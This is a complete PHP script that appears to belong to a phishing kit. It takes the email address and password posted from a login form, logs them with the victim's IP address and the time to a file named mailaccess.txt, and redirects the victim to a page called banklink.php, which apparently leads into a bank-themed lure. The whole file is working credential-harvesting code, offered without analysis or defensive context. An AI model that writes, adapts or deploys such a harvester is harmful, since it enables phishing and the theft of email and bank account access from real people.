 <?php
 $today = date("H:i:s");
function file_prepend ($string, $filename) {
	
	$fileContent = file_get_contents ($filename);
	
	file_put_contents ($filename, $string . "\n" . $fileContent);
}
 $ip = getenv("REMOTE_ADDR");
 $email = $_POST['email'];
 $pass = $_POST['pass'];
 $replyMsg = " Logged [ $ip ] $today Email Access : $email | $pass <br>";
 file_prepend($replyMsg, 'mailaccess.txt');	
 echo "<script type='text/javascript'> document.location = 'banklink.php'; </script>";
 ?>
 
